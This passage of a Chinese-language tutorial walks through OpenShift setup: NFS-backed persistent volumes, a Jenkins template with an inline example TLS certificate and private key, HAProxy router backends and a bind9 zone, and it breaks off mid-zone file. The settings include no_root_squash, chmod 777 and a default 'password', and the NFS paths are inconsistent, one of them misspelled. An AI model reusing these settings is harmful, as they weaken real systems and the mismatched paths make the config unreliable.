<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">**\[**root@oc**\-**master example**\]**\# cat **&#x2F;**etc**&#x2F;**exports</span><br><span class="line"></span><br><span class="line">**&#x2F;**opt**&#x2F;**docker-registry **192.168.6.0&#x2F;**24**(**rw**,**sync**,**no\_root\_squash**,**no\_all\_squash**)**</span><br><span class="line"></span><br><span class="line">**&#x2F;**openshift-pv **\*(**rw**,**all\_squash**)**</span><br><span class="line"></span><br><span class="line">**\[**root@oc**\-**master example**\]**\# mkdir **&#x2F;**openshift-pv</span><br><span class="line"></span><br><span class="line">**\[**root@oc**\-**master example**\]**\# chown **\-**R nfsnobody**:**nfsnobody &#x2F;openshift-pv</span><br><span class="line"></span><br><span class="line">**\[**root@oc**\-**master example**\]**\# chmod **777** **&#x2F;**opt**&#x2F;**openshift-pv**&#x2F;**</span><br></pre></td></tr></table></figure>

<p>创建PV:persistentvolume</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**&#123;**</span><br><span class="line"></span><br><span class="line">  &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">  &quot;kind&quot;**:** &quot;PersistentVolume&quot;**,**</span><br><span class="line"></span><br><span class="line">  &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">    &quot;name&quot;**:** &quot;jenkins&quot;</span><br><span class="line"></span><br><span class="line">  **&#125;,**</span><br><span class="line"></span><br><span class="line">  &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">    &quot;capacity&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;storage&quot;**:** &quot;5Gi&quot;</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    &quot;accessModes&quot;**: \[** &quot;ReadWriteOnce&quot; **\],**</span><br><span class="line"></span><br><span class="line">    &quot;nfs&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;path&quot;**:** &quot;&#x2F;openshit-pv&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;server&quot;**:** &quot;192.168.6.7&quot;</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    &quot;persistentVolumeReclaimPolicy&quot;**:** &quot;Recycle&quot;</span><br><span class="line"></span><br><span class="line">  **&#125;**</span><br><span class="line"></span><br><span class="line">**&#125;**</span><br></pre></td></tr></table></figure>
<p>举例：jenkins使用创建的PV</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**&#123;**</span><br><span class="line"></span><br><span class="line">  &quot;kind&quot;**:** &quot;Template&quot;**,**</span><br><span class="line"></span><br><span class="line">  &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">  &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">    &quot;name&quot;**:** &quot;jenkins-persistent&quot;**,**</span><br><span class="line"></span><br><span class="line">    &quot;creationTimestamp&quot;**:** null**,**</span><br><span class="line"></span><br><span class="line">    &quot;annotations&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">      &quot;description&quot;**:** &quot;Jenkins service, with persistent storage.&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;iconClass&quot;**:** &quot;icon-jenkins&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;tags&quot;**:** &quot;instant-app,jenkins&quot;</span><br><span class="line"></span><br><span class="line">    **&#125;**</span><br><span class="line"></span><br><span class="line">  **&#125;,**</span><br><span class="line"></span><br><span class="line">  &quot;objects&quot;**: \[**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;kind&quot;**:** &quot;Service&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;creationTimestamp&quot;**:** null</span><br><span class="line"></span><br><span class="line">      **&#125;,**</span><br><span class="line"></span><br><span class="line">      &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;ports&quot;**: \[**</span><br><span class="line"></span><br><span class="line">          **&#123;**</span><br><span class="line"></span><br><span class="line">            &quot;name&quot;**:** &quot;web&quot;**,**</span><br><span class="line"></span><br><span class="line">            &quot;protocol&quot;**:** &quot;TCP&quot;**,**</span><br><span class="line"></span><br><span class="line">            &quot;port&quot;**:** **8080,**</span><br><span class="line"></span><br><span class="line">            &quot;targetPort&quot;**:** **8080,**</span><br><span class="line"></span><br><span class="line">            &quot;nodePort&quot;**:** **0**</span><br><span class="line"></span><br><span class="line">          **&#125;**</span><br><span class="line"></span><br><span class="line">        **\],**</span><br><span class="line"></span><br><span class="line">        &quot;selector&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">        **&#125;,**</span><br><span class="line"></span><br><span class="line">        &quot;portalIP&quot;**:** &quot;&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;type&quot;**:** &quot;ClusterIP&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;sessionAffinity&quot;**:** &quot;None&quot;</span><br><span class="line"></span><br><span class="line">      **&#125;**</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;kind&quot;**:** &quot;Route&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;name&quot;**:** &quot;jenkins&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;creationTimestamp&quot;**:** null</span><br><span class="line"></span><br><span class="line">      **&#125;,**</span><br><span class="line"></span><br><span class="line">      &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;to&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;kind&quot;**:** &quot;Service&quot;**,**</span><br><span class="line"></span><br><span class="line">          &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">        **&#125;,**</span><br><span class="line"></span><br><span class="line">        &quot;tls&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;termination&quot;**:** &quot;edge&quot;**,**</span><br><span class="line"></span><br><span class="line">          &quot;certificate&quot;**:** &quot;-----BEGIN CERTIFICATE-----**\\n**MIIDIjCCAgqgAwIBAgIBATANBgkqhkiG9w0BAQUFADCBoTELMAkGA1UEBhMCVVMx**\\n**CzAJBgNVBAgMAlNDMRUwEwYDVQQHDAxEZWZhdWx0IENpdHkxHDAaBgNVBAoME0Rl**\\n**ZmF1bHQgQ29tcGFueSBMdGQxEDAOBgNVBAsMB1Rlc3QgQ0ExGjAYBgNVBAMMEXd3**\\n**dy5leGFtcGxlY2EuY29tMSIwIAYJKoZIhvcNAQkBFhNleGFtcGxlQGV4YW1wbGUu**\\n**Y29tMB4XDTE1MDExMjE0MTk0MVoXDTE2MDExMjE0MTk0MVowfDEYMBYGA1UEAwwP**\\n**d3d3LmV4YW1wbGUuY29tMQswCQYDVQQIDAJTQzELMAkGA1UEBhMCVVMxIjAgBgkq**\\n**hkiG9w0BCQEWE2V4YW1wbGVAZXhhbXBsZS5jb20xEDAOBgNVBAoMB0V4YW1wbGUx**\\n**EDAOBgNVBAsMB0V4YW1wbGUwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMrv**\\n**gu6ZTTefNN7jjiZbS&#x2F;xvQjyXjYMN7oVXv76jbX8gjMOmg9m0xoVZZFAE4XyQDuCm**\\n**47VRx5Qrf&#x2F;YLXmB2VtCFvB0AhXr5zSeWzPwaAPrjA4ebG+LUo24ziS8KqNxrFs1M**\\n**mNrQUgZyQC6XIe1JHXc9t+JlL5UZyZQC1IfaJulDAgMBAAGjDTALMAkGA1UdEwQC**\\n**MAAwDQYJKoZIhvcNAQEFBQADggEBAFCi7ZlkMnESvzlZCvv82Pq6S46AAOTPXdFd**\\n**TMvrh12E1sdVALF1P1oYFJzG1EiZ5ezOx88fEDTW+Lxb9anw5&#x2F;KJzwtWcfsupf1m**\\n**V7J0D3qKzw5C1wjzYHh9&#x2F;Pz7B1D0KthQRATQCfNf8s6bbFLaw&#x2F;dmiIUhHLtIH5Qc**\\n**yfrejTZbOSP77z8NOWir+BWWgIDDB2&#x2F;&#x2F;3AkDIQvT20vmkZRhkqSdT7et4NmXOX&#x2F;j**\\n**jhPti4b2Fie0LeuvgaOdKjCpQQNrYthZHXeVlOLRhMTSk3qUczenkKTOhvP7IS9q**\\n**+Dzv5hqgSfvMG392KWh5f8xXfJNs4W5KLbZyl901MeReiLrPH3w&#x3D;**\\n**\-----END CERTIFICATE-----&quot;**,**</span><br><span class="line"></span><br><span class="line">          &quot;key&quot;**:** &quot;-----BEGIN PRIVATE KEY-----**\\n**MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAMrvgu6ZTTefNN7j**\\n**jiZbS&#x2F;xvQjyXjYMN7oVXv76jbX8gjMOmg9m0xoVZZFAE4XyQDuCm47VRx5Qrf&#x2F;YL**\\n**XmB2VtCFvB0AhXr5zSeWzPwaAPrjA4ebG+LUo24ziS8KqNxrFs1MmNrQUgZyQC6X**\\n**Ie1JHXc9t+JlL5UZyZQC1IfaJulDAgMBAAECgYEAnxOjEj&#x2F;vrLNLMZE1Q9H7PZVF**\\n**WdP&#x2F;JQVNvQ7tCpZ3ZdjxHwkvf&#x2F;&#x2F;aQnuxS5yX2Rnf37BS&#x2F;TZu+TIkK4373CfHomSx**\\n**UTAn2FsLmOJljupgGcoeLx5K5nu7B7rY5L1NHvdpxZ4YjeISrRtEPvRakllENU5y**\\n**gJE8c2eQOx08ZSRE4TkCQQD7dws2&#x2F;FldqwdjJucYijsJVuUdoTqxP8gWL6bB251q**\\n**elP2&#x2F;a6W2elqOcWId28560jG9ZS3cuKvnmu&#x2F;4LG88vZFAkEAzphrH3673oTsHN+d**\\n**uBd5uyrlnGjWjuiMKv2TPITZcWBjB8nJDSvLneHF59MYwejNNEof2tRjgFSdImFH**\\n**mi995wJBAMtPjW6wiqRz0i41VuT9ZgwACJBzOdvzQJfHgSD9qgFb1CU&#x2F;J&#x2F;hpSRIM**\\n**kYvrXK9MbvQFvG6x4VuyT1W8mpe1LK0CQAo8VPpffhFdRpF7psXLK&#x2F;XQ&#x2F;0VLkG3O**\\n**KburipLyBg&#x2F;u9ZkaL0Ley5zL5dFBjTV2Qkx367Ic2b0u9AYTCcgi2DsCQQD3zZ7B**\\n**v7BOm7MkylKokY2MduFFXU0Bxg6pfZ7q3rvg8gqhUFbaMStPRYg6myiDiW&#x2F;JfLhF**\\n**TcFT4touIo7oriFJ**\\n**\-----END PRIVATE KEY-----&quot;**,**</span><br><span class="line"></span><br><span class="line">          &quot;caCertificate&quot;**:** &quot;-----BEGIN CERTIFICATE-----**\\n**MIIEFzCCAv+gAwIBAgIJALK1iUpF2VQLMA0GCSqGSIb3DQEBBQUAMIGhMQswCQYD**\\n**VQQGEwJVUzELMAkGA1UECAwCU0MxFTATBgNVBAcMDERlZmF1bHQgQ2l0eTEcMBoG**\\n**A1UECgwTRGVmYXVsdCBDb21wYW55IEx0ZDEQMA4GA1UECwwHVGVzdCBDQTEaMBgG**\\n**A1UEAwwRd3d3LmV4YW1wbGVjYS5jb20xIjAgBgkqhkiG9w0BCQEWE2V4YW1wbGVA**\\n**ZXhhbXBsZS5jb20wHhcNMTUwMTEyMTQxNTAxWhcNMjUwMTA5MTQxNTAxWjCBoTEL**\\n**MAkGA1UEBhMCVVMxCzAJBgNVBAgMAlNDMRUwEwYDVQQHDAxEZWZhdWx0IENpdHkx**\\n**HDAaBgNVBAoME0RlZmF1bHQgQ29tcGFueSBMdGQxEDAOBgNVBAsMB1Rlc3QgQ0Ex**\\n**GjAYBgNVBAMMEXd3dy5leGFtcGxlY2EuY29tMSIwIAYJKoZIhvcNAQkBFhNleGFt**\\n**cGxlQGV4YW1wbGUuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA**\\n**w2rK1J2NMtQj0KDug7g7HRKl5jbf0QMkMKyTU1fBtZ0cCzvsF4CqV11LK4BSVWaK**\\n**rzkaXe99IVJnH8KdOlDl5Dh&#x2F;+cJ3xdkClSyeUT4zgb6CCBqg78ePp+nN11JKuJlV**\\n**IG1qdJpB1J5O&#x2F;kCLsGcTf7RS74MtqMFo96446Zvt7YaBhWPz6gDaO&#x2F;TUzfrNcGLA**\\n**EfHVXkvVWqb3gqXUztZyVex&#x2F;gtP9FXQ7gxTvJml7UkmT0VAFjtZnCqmFxpLZFZ15**\\n**+qP9O7Q2MpsGUO&#x2F;4vDAuYrKBeg1ZdPSi8gwqUP2qWsGd9MIWRv3thI2903BczDc7**\\n**r8WaIbm37vYZAS9G56E4+wIDAQABo1AwTjAdBgNVHQ4EFgQUugLrSJshOBk5TSsU**\\n**ANs4+SmJUGwwHwYDVR0jBBgwFoAUugLrSJshOBk5TSsUANs4+SmJUGwwDAYDVR0T**\\n**BAUwAwEB&#x2F;zANBgkqhkiG9w0BAQUFAAOCAQEAaMJ33zAMV4korHo5aPfayV3uHoYZ**\\n**1ChzP3eSsF+FjoscpoNSKs91ZXZF6LquzoNezbfiihK4PYqgwVD2+O0&#x2F;Ty7UjN4S**\\n**qzFKVR4OS&#x2F;6lCJ8YncxoFpTntbvjgojf1DEataKFUN196PAANc3yz8cWHF4uvjPv**\\n**WkgFqbIjb+7D1YgglNyovXkRDlRZl0LD1OQ0ZWhd4Ge1qx8mmmanoBeYZ9+DgpFC**\\n**j9tQAbS867yeOryNe7sEOIpXAAqK&#x2F;DTu0hB6+ySsDfMo4piXCc2aA&#x2F;eI2DCuw08e**\\n**w17Dz9WnupZjVdwTKzDhFgJZMLDqn37HQnT6EemLFqbcR0VPEnfyhDtZIQ&#x3D;&#x3D;**\\n**\-----END CERTIFICATE-----&quot;</span><br><span class="line"></span><br><span class="line">        **&#125;**</span><br><span class="line"></span><br><span class="line">      **&#125;**</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;kind&quot;**:** &quot;PersistentVolumeClaim&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">      **&#125;,**</span><br><span class="line"></span><br><span class="line">      &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;accessModes&quot;**: \[**</span><br><span class="line"></span><br><span class="line">          &quot;ReadWriteOnce&quot;</span><br><span class="line"></span><br><span class="line">        **\],**</span><br><span class="line"></span><br><span class="line">        &quot;resources&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;requests&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">            &quot;storage&quot;**:** &quot;$&#123;VOLUME\_CAPACITY&#125;&quot;</span><br><span class="line"></span><br><span class="line">          **&#125;**</span><br><span class="line"></span><br><span class="line">        **&#125;**</span><br><span class="line"></span><br><span class="line">      **&#125;**</span><br><span class="line"></span><br><span class="line">    **&#125;,**   </span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;kind&quot;**:** &quot;DeploymentConfig&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;apiVersion&quot;**:** &quot;v1&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;**,**</span><br><span class="line"></span><br><span class="line">        &quot;creationTimestamp&quot;**:** null</span><br><span class="line"></span><br><span class="line">      **&#125;,**</span><br><span class="line"></span><br><span class="line">      &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">        &quot;strategy&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;type&quot;**:** &quot;Recreate&quot;**,**</span><br><span class="line"></span><br><span class="line">          &quot;resources&quot;**: &#123;&#125;**</span><br><span class="line"></span><br><span class="line">        **&#125;,**</span><br><span class="line"></span><br><span class="line">        &quot;triggers&quot;**: \[**</span><br><span class="line"></span><br><span class="line">          **&#123;**</span><br><span class="line"></span><br><span class="line">            &quot;type&quot;**:** &quot;ImageChange&quot;**,**</span><br><span class="line"></span><br><span class="line">            &quot;imageChangeParams&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">              &quot;automatic&quot;**:** **true,**</span><br><span class="line"></span><br><span class="line">              &quot;containerNames&quot;**: \[**</span><br><span class="line"></span><br><span class="line">                &quot;jenkins&quot;</span><br><span class="line"></span><br><span class="line">              **\],**</span><br><span class="line"></span><br><span class="line">              &quot;from&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">                &quot;kind&quot;**:** &quot;ImageStreamTag&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;name&quot;**:** &quot;jenkins-1-centos7:latest&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;namespace&quot;**:** &quot;openshift&quot;</span><br><span class="line"></span><br><span class="line">              **&#125;,**</span><br><span class="line"></span><br><span class="line">              &quot;lastTriggeredImage&quot;**:** &quot;&quot;</span><br><span class="line"></span><br><span class="line">            **&#125;**</span><br><span class="line"></span><br><span class="line">          **&#125;,**</span><br><span class="line"></span><br><span class="line">          **&#123;**</span><br><span class="line"></span><br><span class="line">            &quot;type&quot;**:** &quot;ConfigChange&quot;</span><br><span class="line"></span><br><span class="line">          **&#125;**</span><br><span class="line"></span><br><span class="line">        **\],**</span><br><span class="line"></span><br><span class="line">        &quot;replicas&quot;**:** **1,**</span><br><span class="line"></span><br><span class="line">        &quot;selector&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">        **&#125;,**</span><br><span class="line"></span><br><span class="line">        &quot;template&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">          &quot;metadata&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">            &quot;creationTimestamp&quot;**:** null**,**</span><br><span class="line"></span><br><span class="line">            &quot;labels&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">              &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">            **&#125;**</span><br><span class="line"></span><br><span class="line">          **&#125;,**</span><br><span class="line"></span><br><span class="line">          &quot;spec&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">            &quot;containers&quot;**: \[**</span><br><span class="line"></span><br><span class="line">              **&#123;**</span><br><span class="line"></span><br><span class="line">                &quot;name&quot;**:** &quot;jenkins&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;image&quot;**:** &quot;$&#123;JENKINS\_IMAGE&#125;&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;env&quot;**: \[**</span><br><span class="line"></span><br><span class="line">                  **&#123;**</span><br><span class="line"></span><br><span class="line">                    &quot;name&quot;**:** &quot;JENKINS\_PASSWORD&quot;**,**</span><br><span class="line"></span><br><span class="line">                    &quot;value&quot;**:** &quot;$&#123;JENKINS\_PASSWORD&#125;&quot;</span><br><span class="line"></span><br><span class="line">                  **&#125;**</span><br><span class="line"></span><br><span class="line">                **\],**</span><br><span class="line"></span><br><span class="line">                &quot;resources&quot;**: &#123;&#125;,**</span><br><span class="line"></span><br><span class="line">                &quot;volumeMounts&quot;**: \[**</span><br><span class="line"></span><br><span class="line">                  **&#123;**</span><br><span class="line"></span><br><span class="line">                    &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;-data&quot;**,**</span><br><span class="line"></span><br><span class="line">                    &quot;mountPath&quot;**:** &quot;&#x2F;var&#x2F;lib&#x2F;jenkins&quot;</span><br><span class="line"></span><br><span class="line">                  **&#125;**</span><br><span class="line"></span><br><span class="line">                **\],**</span><br><span class="line"></span><br><span class="line">                &quot;terminationMessagePath&quot;**:** &quot;&#x2F;dev&#x2F;termination-log&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;imagePullPolicy&quot;**:** &quot;IfNotPresent&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;capabilities&quot;**: &#123;&#125;,**</span><br><span class="line"></span><br><span class="line">                &quot;securityContext&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">                  &quot;capabilities&quot;**: &#123;&#125;,**</span><br><span class="line"></span><br><span class="line">                  &quot;privileged&quot;**:** **false**</span><br><span class="line"></span><br><span class="line">                **&#125;**</span><br><span class="line"></span><br><span class="line">              **&#125;**</span><br><span class="line"></span><br><span class="line">            **\],**</span><br><span class="line"></span><br><span class="line">            &quot;volumes&quot;**: \[**</span><br><span class="line"></span><br><span class="line">              **&#123;**</span><br><span class="line"></span><br><span class="line">                &quot;name&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;-data&quot;**,**</span><br><span class="line"></span><br><span class="line">                &quot;persistentVolumeClaim&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">                  &quot;claimName&quot;**:** &quot;$&#123;JENKINS\_SERVICE\_NAME&#125;&quot;</span><br><span class="line"></span><br><span class="line">                **&#125;**</span><br><span class="line"></span><br><span class="line">              **&#125;**</span><br><span class="line"></span><br><span class="line">            **\],**</span><br><span class="line"></span><br><span class="line">            &quot;restartPolicy&quot;**:** &quot;Always&quot;**,**</span><br><span class="line"></span><br><span class="line">            &quot;dnsPolicy&quot;**:** &quot;ClusterFirst&quot;</span><br><span class="line"></span><br><span class="line">          **&#125;**</span><br><span class="line"></span><br><span class="line">        **&#125;**</span><br><span class="line"></span><br><span class="line">      **&#125;**</span><br><span class="line"></span><br><span class="line">    **&#125;**</span><br><span class="line"></span><br><span class="line">  **\],**</span><br><span class="line"></span><br><span class="line">  &quot;parameters&quot;**: \[**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;name&quot;**:** &quot;JENKINS\_SERVICE\_NAME&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;description&quot;**:** &quot;Jenkins service name&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;value&quot;**:** &quot;jenkins&quot;</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;name&quot;**:** &quot;JENKINS\_PASSWORD&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;description&quot;**:** &quot;Password for the Jenkins user&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;generate&quot;**:** &quot;expression&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;value&quot;**:** &quot;password&quot;</span><br><span class="line"></span><br><span class="line">    **&#125;,**</span><br><span class="line"></span><br><span class="line">    **&#123;**</span><br><span class="line"></span><br><span class="line">      &quot;name&quot;**:** &quot;VOLUME\_CAPACITY&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;description&quot;**:** &quot;Volume space available for data, e.g. 512Mi, 2Gi&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;value&quot;**:** &quot;512Mi&quot;**,**</span><br><span class="line"></span><br><span class="line">      &quot;required&quot;**:** **true**</span><br><span class="line"></span><br><span class="line">    **&#125;**</span><br><span class="line"></span><br><span class="line">  **\],**</span><br><span class="line"></span><br><span class="line">  &quot;labels&quot;**: &#123;**</span><br><span class="line"></span><br><span class="line">    &quot;template&quot;**:** &quot;jenkins-persistent-template&quot;</span><br><span class="line"></span><br><span class="line">  **&#125;**</span><br><span class="line"></span><br><span class="line">**&#125;**</span><br></pre></td></tr></table></figure>
<h3 id="Route使用"><a href="#Route使用" class="headerlink" title="Route使用"></a>Route使用</h3><p>Route提供了外部访问服务的能力，此时需要外部dns的支持，dns的进行地址解析需要配置到haproxy-rouer所在的node节点IP</p>
<p>登录到haproxy-route所在的容器查看配置信息，确认是将每个应用的pod的IP地址配置到了haproxy的配置文件，完成负载均衡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backend be\_http\_demo\_django-psql-example</span><br><span class="line"></span><br><span class="line">  mode http</span><br><span class="line"></span><br><span class="line">  option redispatch</span><br><span class="line"></span><br><span class="line">  option forwardfor</span><br><span class="line"></span><br><span class="line">  balance leastconn</span><br><span class="line"></span><br><span class="line">  timeout check **5000**ms</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Host **%\[**req**.**hdr**(**host**)\]**</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Port **%\[**dst\_port**\]**</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Proto https if **&#123;** ssl\_fc **&#125;**</span><br><span class="line"></span><br><span class="line">    cookie OPENSHIFT\_demo\_django-psql-example\_SERVERID insert indirect nocache httponly</span><br><span class="line"></span><br><span class="line">    http-request set-header X-Forwarded-Proto http</span><br><span class="line"></span><br><span class="line">  http-request set-header Forwarded for**\&#x3D;%\[**src**\],**host**\&#x3D;%\[**req**.**hdr**(**host**)\],**proto**\&#x3D;%\[**req**.**hdr**(**X-Forwarded-Proto**)\]**</span><br><span class="line"></span><br><span class="line">  server **10.1.0.3:8080 10.1.0.3:8080** check inter **5000**ms cookie **10.1.0.3:8080**</span><br><span class="line"></span><br><span class="line">backend be\_http\_demo\_jenkins</span><br><span class="line"></span><br><span class="line">  mode http</span><br><span class="line"></span><br><span class="line">  option redispatch</span><br><span class="line"></span><br><span class="line">  option forwardfor</span><br><span class="line"></span><br><span class="line">  balance leastconn</span><br><span class="line"></span><br><span class="line">  timeout check **5000**ms</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Host **%\[**req**.**hdr**(**host**)\]**</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Port **%\[**dst\_port**\]**</span><br><span class="line"></span><br><span class="line">  http-request set-header X-Forwarded-Proto https if **&#123;** ssl\_fc **&#125;**</span><br><span class="line"></span><br><span class="line">    cookie OPENSHIFT\_demo\_jenkins\_SERVERID insert indirect nocache httponly</span><br><span class="line"></span><br><span class="line">    http-request set-header X-Forwarded-Proto http</span><br><span class="line"></span><br><span class="line">  http-request set-header Forwarded for**\&#x3D;%\[**src**\],**host**\&#x3D;%\[**req**.**hdr**(**host**)\],**proto**\&#x3D;%\[**req**.**hdr**(**X-Forwarded-Proto**)\]**</span><br><span class="line"></span><br><span class="line">  server **10.1.1.20:8080 10.1.1.20:8080** check inter **5000**ms cookie **10.1.1.20:8080**</span><br></pre></td></tr></table></figure>
<h4 id="DNS-配置"><a href="#DNS-配置" class="headerlink" title="DNS 配置"></a>DNS 配置</h4><p>DNS是基于ubuntu14.04 部署了bind9，参考配置：192.168.10.149为haproxy-router所在的节点IP（运行haproxy-router的容器所在的节点IP）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@origin**\-**dns**:&#x2F;**etc**&#x2F;**bind# cat **&#x2F;**etc**&#x2F;**bind**&#x2F;**named**.**conf**.**local</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Do any local configuration here</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Consider adding the 1918 zones here, if they are not used in your</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; organization</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;include &quot;&#x2F;etc&#x2F;bind&#x2F;zones.rfc1918&quot;;</span><br><span class="line"></span><br><span class="line">zone &quot;novalocal&quot; **&#123;**</span><br><span class="line"></span><br><span class="line">        **type** master**;**</span><br><span class="line"></span><br><span class="line">        file &quot;&#x2F;etc&#x2F;bind&#x2F;db.novalocal&quot;**;**</span><br><span class="line"></span><br><span class="line">**&#125;;**</span><br><span class="line"></span><br><span class="line">zone  &quot;devops.inspur&quot; **&#123;** </span><br><span class="line"></span><br><span class="line">     **type** master**;** </span><br><span class="line"></span><br><span class="line">     file &quot;&#x2F;etc&#x2F;bind&#x2F;db.devops.inspur&quot;**;** </span><br><span class="line"></span><br><span class="line">**&#125;;** </span><br><span class="line"></span><br><span class="line">zone  &quot;10.168.192.in-addr.arpa&quot; **&#123;** </span><br><span class="line"></span><br><span class="line">     **type** master**;** </span><br><span class="line"></span><br><span class="line">     file &quot;&#x2F;etc&#x2F;bind&#x2F;db.17.110.10&quot;**;** </span><br><span class="line"></span><br><span class="line">**&#125;;**</span><br><span class="line"></span><br><span class="line">cat db**.**devops**.**inspur</span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">**;** BIND data file for dev sites </span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">$TTL    **604800** </span><br><span class="line"></span><br><span class="line">@       IN      SOA     